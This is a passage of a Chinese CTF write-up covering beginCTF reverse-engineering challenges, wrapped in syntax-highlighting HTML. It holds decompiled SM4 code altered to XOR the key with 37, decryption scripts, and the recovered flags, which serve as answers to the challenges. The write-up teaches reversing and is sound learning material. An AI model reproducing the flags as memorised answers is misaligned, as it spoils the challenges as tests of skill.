class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            bb <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            c <span class="token operator">=</span> bb <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> c        <span class="token keyword">return</span> x0 <span class="token operator">^</span> _sm4_l_t<span class="token punctuation">(</span>x1 <span class="token operator">^</span> x2 <span class="token operator">^</span> x3 <span class="token operator">^</span> rk<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">set_key</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> bytes_to_list<span class="token punctuation">(</span>key<span class="token punctuation">)</span>        key <span class="token operator">=</span> <span class="token punctuation">[</span>k <span class="token operator">^</span> <span class="token number">37</span> <span class="token keyword">for</span> k <span class="token keyword">in</span> key<span class="token punctuation">]</span>        MK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>        k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">36</span>        MK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        MK<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        MK<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        MK<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> xor<span class="token punctuation">(</span>MK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> SM4_FK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_round_key<span class="token punctuation">(</span>k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> SM4_CK<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>mode <span class="token operator">=</span> mode            <span class="token keyword">if</span> mode <span class="token operator">==</span> SM4_DECRYPT<span class="token punctuation">:</span>                <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    t <span class="token operator">=</span> self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                    self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> idx<span class="token punctuation">]</span>                    self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> idx<span class="token punctuation">]</span> <span class="token operator">=</span> t    <span class="token keyword">def</span> <span class="token function">one_round</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sk<span class="token punctuation">,</span> in_put<span class="token punctuation">)</span><span class="token punctuation">:</span>        out_put <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        ulbuf <span class="token operator">=</span> <span class="token punctuation">[</span>         <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">36</span>        ulbuf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ulbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ulbuf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ulbuf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>_f<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> out_put    <span class="token keyword">def</span> <span class="token function">crypt_ecb</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>        input_data <span class="token operator">=</span> bytes_to_list<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>mode <span class="token operator">==</span> SM4_ENCRYPT<span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> PKCS7<span class="token punctuation">:</span>                input_data <span class="token operator">=</span> pkcs7_padding<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> ZERO<span class="token punctuation">:</span>                    input_data <span class="token operator">=</span> zero_padding<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            output_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                    output_data <span class="token operator">+=</span> self<span class="token punctuation">.</span>one_round<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sk<span class="token punctuation">,</span> input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">16</span>                    length <span class="token operator">-=</span> <span class="token number">16</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>mode <span class="token operator">==</span> SM4_DECRYPT<span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> PKCS7<span class="token punctuation">:</span>                <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>pkcs7_unpadding<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> ZERO<span class="token punctuation">:</span>                <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>zero_unpadding<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">crypt_cbc</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">0</span>        output_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        tmp_input <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>        iv <span class="token operator">=</span> bytes_to_list<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>mode <span class="token operator">==</span> SM4_ENCRYPT<span class="token punctuation">:</span>            input_data <span class="token operator">=</span> pkcs7_padding<span class="token punctuation">(</span>bytes_to_list<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span>            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                    tmp_input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> xor<span class="token punctuation">(</span>input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> iv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    output_data <span class="token operator">+=</span> self<span class="token punctuation">.</span>one_round<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sk<span class="token punctuation">,</span> tmp_input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    iv <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>output_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">16</span>                    length <span class="token operator">-=</span> <span class="token number">16</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span>            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                    output_data <span class="token operator">+=</span> self<span class="token punctuation">.</span>one_round<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sk<span class="token punctuation">,</span> input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    output_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> xor<span class="token punctuation">(</span>output_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> iv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    iv <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">16</span>                    length <span class="token operator">-=</span> <span class="token number">16</span>        <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>pkcs7_unpadding<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># okay decompiling C:\Users\Npc\Desktop\CTF\beginCTF\beginctfRE\ezpython\ezpython.exe_extracted\PYZ-00.pyz_extracted\gmssl\sm4.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接SM4一把梭，结果发现得不到flag，猜测SM4加密算法进行了魔改</p><p>120236</p><p>diff一下sm4源码发现key多^了个37，直接在原有的基础上写解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">pad_pkcs7</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7填充"""</span>    padding_len <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span>    padding <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>padding_len<span class="token punctuation">]</span> <span class="token operator">*</span> padding_len<span class="token punctuation">)</span>    <span class="token keyword">return</span> data <span class="token operator">+</span> padding<span class="token keyword">def</span> <span class="token function">unpad_pkcs7</span><span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7去填充"""</span>    padding_len <span class="token operator">=</span> padded_data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> padded_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>padding_len<span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">SM4</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>gmsm4 <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decryptSM4</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> encrypt_key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        gmsm4 <span class="token operator">=</span> self<span class="token punctuation">.</span>gmsm4        gmsm4<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>encrypt_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_DECRYPT<span class="token punctuation">)</span>        padded_value <span class="token operator">=</span> pad_pkcs7<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        decrypt_value <span class="token operator">=</span> gmsm4<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_value<span class="token punctuation">)</span>        <span class="token keyword">return</span> decrypt_value<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key1 <span class="token operator">=</span> <span class="token string">'BeginCTFBeginCTF'</span>    key<span class="token operator">=</span><span class="token string">''</span>    enc <span class="token operator">=</span> <span class="token string">b'JmjJEAJGMT6F9bmC+Vyxy8Z1lpfaJzdEX6BGG/qgqUjUpQaYSON1CnZyX9YXTEClSRYm7PFZtGxmJw6LPuw1ww=='</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> key1<span class="token punctuation">:</span>        key<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">37</span><span class="token punctuation">)</span>    sm4_instance <span class="token operator">=</span> SM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> sm4_instance<span class="token punctuation">.</span>decryptSM4<span class="token punctuation">(</span>key<span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;Pay_M0re_@ttention_to_th3_key!!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="出题人的密码是什么"><a class="markdownIt-Anchor" href="#出题人的密码是什么"></a> <strong>出题人的密码是什么</strong></h2><p>先查壳，无壳，直接ida打开</p><p>最后得到函数主逻辑</p><p>126563</p><p>想找到函数加密的逻辑只能一个一个地翻函数，翻了三十多个，找到了账号的加密方式</p><p>126660</p><p>126717</p><p>从二进制角度理解更容易逆向</p><p>和0比较实际上是比较最高位（标志位）是0还是1：</p><ul><li>如果是1(负数），就左移一位（*2）与key异或</li><li>由于key最后一位是1，v6左移一位最后一位是0，异或结果最后一位必然是1。因此逆向的时候，如果一次加密后最后一位是1，这次加密前它肯定是负数</li><li>如果是0（正数），就左移一位，最后一位就变成0。同理，最后一位是0的本次加密前一定是正数。</li></ul><p>类似CRC的部分需要动调获得key的值，虽然是随机生成的但是其值不变</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token number">0x33077D</span>enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#异或部分逆向</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>enc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0x25</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>    enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token comment">#CRC部分加密</span><span class="token keyword">def</span> <span class="token function">decrc</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value<span class="token operator">&amp;</span><span class="token number">1</span> <span class="token punctuation">:</span>            value<span class="token operator">=</span><span class="token punctuation">(</span>value<span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token comment">#最后一位是1，加密前肯定是负数</span>            value <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x8000000000000000</span>         <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment">#最后一位是0，加密前必为正数</span>            value<span class="token operator">=</span>value<span class="token operator">>></span><span class="token number">1</span>    <span class="token keyword">return</span> valueflag<span class="token operator">=</span><span class="token string">b''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc1<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'little'</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>decrc<span class="token punctuation">(</span>enc1<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'begin&#123;Th1s_reverse_pr0blem_may_t@ke_some_time#!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="stick-game"><a class="markdownIt-Anchor" href="#stick-game"></a> <strong>stick game</strong></h2><p>使用js在线工具格式化然后这是混淆后的代码，找到score发生改变 的位置，手动给score加点分</p><p>135955</p><p>136012</p><h2 id="arc"><a class="markdownIt-Anchor" href="#arc"></a> <strong>Arc</strong></h2><p>这题的基本思路是这样的</p><p>136094</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token 